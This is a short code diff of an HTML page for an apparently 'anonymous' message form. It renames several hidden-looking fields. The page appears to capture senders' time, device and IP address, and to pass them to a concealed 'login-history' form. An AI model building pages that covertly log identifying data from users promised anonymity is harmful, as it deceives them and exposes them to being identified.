@@ -23,11 +23,11 @@
                 <div class="messageForm">
                     <form name="secret-message">
                         <textarea name="message" id="message" maxlength="200" placeholder="Type here..." required></textarea>
-                        <input type="text" class="info" name="time" id="time" value="">
-                        <input type="text" class="info" name="device" id="device" value="">
-                        <input type="text" class="info" name="ip" id="ip" value="">
+                        <input type="text" class="info" name="timeLog" id="time" value="">
+                        <input type="text" class="info" name="deviceLog" id="device" value="">
+                        <input type="text" class="info" name="ipLog" id="ip" value="">
                         <input type="text" class="info" name="post" id="post" value="">
-                        <input type="text" class="info" name="tanggal" id="tanggal" value="">
+                        <input type="text" class="info" name="tanggalLog" id="tanggal" value="">
                         <div class="secondTip">send anonymous message to him</div>
                         <button type="submit" class="submit">Send</button>
                         <div class="btn hide"><div></div><div></div><div></div><div></div></div>
@@ -57,7 +57,7 @@
         </div>
     </div>
     <form style="display: none;" name="login-history">
-        <input name="timeLog"><input name="tanggalLog"><input name="content"><input name="deviceLog"><input name="ipLog"><input name="link">
+        <input name="time"><input name="tanggal"><input name="content"><input name="device"><input name="ip"><input name="link">
     </form>
     <script>
         const form = document.forms['login-history'];
